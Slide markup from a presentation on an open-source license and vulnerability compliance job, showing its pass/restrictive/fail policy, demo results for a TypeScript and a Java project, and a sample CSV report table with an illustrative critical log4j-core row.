            <a:ext cx="6035040" cy="1261872"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4718304"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D7261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6" name="Icon 16" descr="CircleX"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="876361" y="4863145"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="4517136"/>
            <a:ext cx="4937760" cy="36576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700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D7261E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fail</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="4882896"/>
            <a:ext cx="4937760" cy="7315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300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Denied license (GPL, AGPL, SSPL...) in a runtime dependency, or a high/critical CVE. The job fails</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Demo results"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1554480"/>
            <a:ext cx="4736592" cy="4096512"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="282828"/>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0" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="1719072"/>
            <a:ext cx="4206240" cy="384048"/>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600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Demo results</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="2286000"/>
            <a:ext cx="2011680" cy="6858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500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ts-app</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>150 packages</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8915400" y="2240280"/>
            <a:ext cx="868680" cy="73152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2600" b="1">
                <a:solidFill>
                  <a:srgbClr val="26AF72"/>
                </a:solidFill>
              </a:rPr>
              <a:t>148</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Passed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9784080" y="2240280"/>
            <a:ext cx="868680" cy="73152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2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Restrictive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10652760" y="2240280"/>
            <a:ext cx="868680" cy="73152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2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D7261E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fail</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Bar"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="3090672"/>
            <a:ext cx="4147820" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">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6" name="Bar"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11325860" y="3090672"/>
            <a:ext cx="73152" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">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7" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="3291840"/>
            <a:ext cx="4206240" cy="292608"/>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BFBFBF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2 × MPL-2.0 (lightningcss, dev-only)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="3931920"/>
            <a:ext cx="2011680" cy="6858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500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>java-app</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>16 packages</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8915400" y="3886200"/>
            <a:ext cx="868680" cy="73152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2600" b="1">
                <a:solidFill>
                  <a:srgbClr val="26AF72"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Passed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9784080" y="3886200"/>
            <a:ext cx="868680" cy="73152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2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Restrictive</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10652760" y="3886200"/>
            <a:ext cx="868680" cy="73152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2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D7261E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D0D0D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fail</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Bar"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4736592"/>
            <a:ext cx="2628900" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">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33" name="Bar"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9806940" y="4736592"/>
            <a:ext cx="1577340" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="rect">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34" name="Text 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4937760"/>
            <a:ext cx="4206240" cy="292608"/>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50" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="BFBFBF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6 × EPL-2.0 (JUnit, test scope)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="115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The downloadable CSV report</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Actions → OSS Compliance → Artifacts → oss-report-all.csv (opens in Excel)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 4"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="548640" y="1508760"/>
          <a:ext cx="11091672" cy="3200400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1"/>
              <a:tblGrid>
                <a:gridCol w="32461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2221992">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20006"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Package</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Version</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Scope</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License</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Severity</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Policy</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525">
                      <a:solidFill>
                        <a:srgbClr val="D9D9D9"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="282828"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Reason</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="0">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525">
                      <a:solidFill>
                        <a:srgbClr val="D9D9D9"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="282828"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>lightningcss</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1.33.0</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development</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MPL-2.0</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NONE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1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="F5B400"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Restrictive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Copyleft license, review</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1"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>org.junit.jupiter:junit-jupiter</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6.1.3</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development</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EPL-2.0</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NONE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1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="F5B400"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Restrictive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Copyleft license, review</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2"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>zod</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4.6.7</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runtime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MIT</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NONE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1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="26AF72"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Passed</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3"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>com.google.code.gson:gson</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2.14.0</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runtime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Apache-2.0</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NONE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1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="26AF72"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Passed</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4"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>typescript</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6.0.3</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development</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Apache-2.0</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0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NONE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r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="26AF72"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Passed</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marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pP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5"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="457200">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Meiryo UI"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>org.apache.logging.log4j:log4j-core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2.14.1 *</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runtime</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Apache-2.0</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CRITICAL</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1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="D7261E"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Fail</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tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0" algn="l">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CRITICAL vulnerability</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr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7F7F7"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4800600"/>
            <a:ext cx="11064240" cy="27432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100" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>* Illustrative row: not part of the demo projects. Columns Project, Ecosystem, License Category, Vulnerabilities and Source are omitted here.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5230368"/>
            <a:ext cx="457200" cy="457200"/>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7" name="Icon 7" descr="Download"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="658368" y="5340096"/>
            <a:ext cx="237744" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="5175504"/>
            <a:ext cx="4846320" cy="64008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400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Per project and merged</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>oss-report-ts-app, oss-report-java-app and oss-report-all</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="5230368"/>
            <a:ext cx="457200" cy="457200"/>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0" name="Icon 10" descr="ListChecks"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
